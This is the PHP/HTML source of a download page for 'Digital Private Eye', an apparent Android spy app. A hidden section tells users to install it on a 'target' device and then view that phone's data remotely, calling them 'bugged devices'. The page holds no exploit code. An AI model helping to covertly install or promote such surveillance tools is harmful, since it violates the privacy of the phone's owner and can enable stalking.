<?php
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = "https://play.google.com/store/apps/details?id=com.digitalprivateeyespy";
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Downloads - <?=APPLICATION_NAME;?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="">
        <meta name="author" content="">

        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="css/style.css" />
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/sample/logo-144.png">
        <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/sample/logo-114.png">
        <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/sample/logo-72.png">
        <link rel="apple-touch-icon-precomposed" href="img/sample/logo-57.png">
        <link rel="shortcut icon" href="img/sample/logo.png">
    </head>

    <body>
        <?php include "nav.php"; ?>    
        <div class="clear"></div>
    
        <div class="container-wrapper container-top">
          <div class="container container-top">
            <div class="row">
              <div class="col-md-12 center">
                <h1>Downloads in Google Play Store</h1>
              </div>
            </div>
          </div>
        </div>
    
        <div class="container">
            <div class="row">
                <div class="col-md-3 bs-docs-nav-wrapper">
                    <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
                        <li><a href="#spy" class="list-group-item">Digital Private Eye -Spy</a></li>
                        <li><a href="#viewer" class="list-group-item">Digital Private Eye -Viewer</a></li>
                    </ul>
                </div>
                
                <div class="col-md-8 col-md-offset-1">
                    <h3>Downloads from Google Play Store are currently disabled. </h3>
                    <p>
                        Don't worry, you can still download Digital Private Eye from the <a href="apk-downloads.php">APK downloads page</a>.
                    </p>
                </div>

                <div class="col-md-8 col-md-offset-1" style="display: none;">
                <h2 id="spy">Digital Private Eye -Spy
                    <a href="https://play.google.com/store/apps/details?id=com.phonedatasaver" target="_blank"> <img src="img/download-animated.gif" style="width: 220px;"></a>
                </h2>
                <p>Click the download button to download from Google Play Store<br /> or <br />Search Google Play for 'Phone Data Saver'.</p>
                <ul class="fa-ul">
                  <li><span class="fa fa-li fa-android"></span>
                      Install on a target android device.
                  </li>
                  <li><span class="fa fa-li fa-android"></span>
                      When the installation completes, a registration form is displayed on the device.</li>
                  <li><span class="fa fa-li fa-android"></span>
                    <li>Enter YOUR EMAIL ADDRESS. You will need this to login to view the phone's data from this website or
                        the <a href="#viewer">DPEye Viewer app</a>.</li>
                    </li>
                    <li><span class="fa fa-li fa-android"></span>
                    <li>Ensure you have put in the right email address and press enter.</li>
                    </li>
                    <li><span class="fa fa-li fa-android"></span>Register on the website to view the devices' data.</li>
                    </li>
                </ul>
                <hr />
                  <h2 id="viewer">Digital Private Eye -Viewer
                      <a href="https://play.google.com/store/apps/details?id=com.phonedataviewer" target="_blank"> <img src="img/download-animated.gif" style="width: 220px;"></a>
                  </h2>
                  <p>Install this on an android device to conveniently view all your device(s) data.</p>
                  <p>Click the download button to download from Google Play Store<br /> or <br />Search Google Play for 'Phone Data Viewer'.</p>
                  <ul class="fa-ul">
                      <li><span class="fa fa-li fa-android"></span>Register with your email address.</li>
                      <li><span class="fa fa-li fa-android"></span>If you have registered previously,
                          ensure that you register with the same email address and password.</li>
                  </ul>

                  <p>You can access data on your bugged devices by registering and logging in via this website.</p>
                  <hr />

              </div>
            </div><!-- end row -->
        </div><!-- end container -->
    
    <div class="clear"></div>

    <?php   include "footer.php"; ?>

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      
    $(document).ready(function(){
      $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});
    });
    </script>
  </body>
</html>